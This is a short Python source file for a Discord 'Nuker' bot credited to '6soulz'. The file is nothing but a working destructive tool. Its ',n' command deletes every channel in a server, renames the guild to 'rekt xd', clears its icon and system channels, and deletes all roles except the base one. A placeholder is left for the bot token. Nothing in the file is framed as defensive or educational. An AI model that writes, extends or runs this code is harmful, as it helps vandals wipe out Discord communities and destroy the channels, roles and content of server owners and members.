#bot created by 6soulz
#please do not change the name and claim that the file is yours.

import discord, os, time, logging, json, base64
from discord.ext import commands
from discord.ext.commands import Bot

prefix = ','

client = commands.Bot(command_prefix=prefix, case_insensitive=True)

client.remove_command("help")

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    else:
        raise(error)

@client.event
async def on_ready():
    print("Nuker Successfully running.")
    print(f"Logged into {len(client.guilds)} servers.")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{prefix}help"))

@client.event
async def on_guild_join(server):
    print(f"Joining {server.name}")

@client.command()
async def n(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as E:
            print(E)
            continue
    await ctx.guild.edit(name="rekt xd", icon=None, rules_channel=None, public_updates_channel=None, system_channel=None)
    for role in ctx.guild.roles:
        if not role.position == 0:
            print(role.name)
            try:
                await role.delete()
            except:
                continue
client.run("TOKEN HERE")